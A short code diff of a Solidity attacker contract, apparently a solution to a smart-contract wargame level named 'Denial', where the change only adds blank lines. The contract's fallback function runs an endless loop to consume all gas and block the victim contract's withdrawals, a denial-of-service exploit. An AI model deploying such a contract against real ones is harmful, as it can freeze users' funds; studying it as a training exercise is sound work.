@@ -13,11 +13,13 @@ contract Denile {
         require(target.partner() == address(this));
 
     }
+
     fallback() external payable {
         // (bool succ,) = target.call{gas:gasleft()}(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
     console.logUint(gasleft());
     while(true) {}
     }
+    
 }
 contract Denial {
 
